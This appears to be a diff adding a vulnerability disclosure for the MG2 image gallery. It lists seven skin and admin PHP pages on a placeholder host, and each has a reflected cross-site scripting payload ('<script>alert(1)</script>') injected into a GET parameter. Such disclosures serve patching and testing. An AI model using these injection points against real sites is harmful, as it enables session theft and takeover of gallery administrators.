@@ -1,0 +1,21 @@
+http://www.example.com/mg2/skins/rounded/templates/thumbnails_password.php 
+ - param(GET): list=25&lt;script&gt;alert(1)&lt;/script&gt; 
+ - param(GET): id=25&lt;script&gt;alert(1)&lt;/script&gt; 
+
+http://www.example.com/mg2/skins/rounded/templates/viewimage_comments.php 
+ - param(GET): id=31&lt;script&gt;alert(1)&lt;/script&gt;  
+
+http://www.example.com/mg2/skins/admin/admin1_menu.php 
+ - param(GET): list=41&lt;script&gt;alert(1)&lt;/script&gt; 
+
+http://www.example.com/mg2/skins/admin/admin2_comments.php 
+- param(GET): list=45&lt;script&gt;alert(1)&lt;/script&gt;  
+
+http://www.example.com/mg2/skins/admin/admin2_edit.php  
+- param(GET): editID=53&lt;script&gt;alert(1)&lt;/script&gt;  
+
+http://www.example.com/mg2/skins/admin/admin2_newfolder.php 
+- param(GET): list=59&lt;script&gt;alert(1)&lt;/script&gt; 
+
+http://www.example.com/mg2/skins/admin/admin3_folders.php 
+- param(GET): list=71&lt;script&gt;alert(1)&lt;/script&gt;
